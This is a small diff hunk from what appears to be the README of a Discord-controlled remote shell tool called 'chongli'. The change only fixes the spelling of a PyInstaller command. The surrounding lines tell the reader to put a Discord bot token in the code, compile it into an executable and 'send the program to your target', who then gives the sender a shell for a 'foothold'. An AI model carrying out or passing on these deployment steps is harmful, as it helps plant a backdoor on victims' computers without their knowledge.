@@ -24,7 +24,7 @@ now that you are all set go to discord developer portal create a bot and setup a
 copy the discord bot's token and put it in token variable and you are ready to compile the code
 
 ```
-pyinstaler -F chongli.py
+pyinstaller -F chongli.py
 ``` 
 
 now just send the program to your target when they run it you get a very small but usable shell that can be used for foothold or anything else
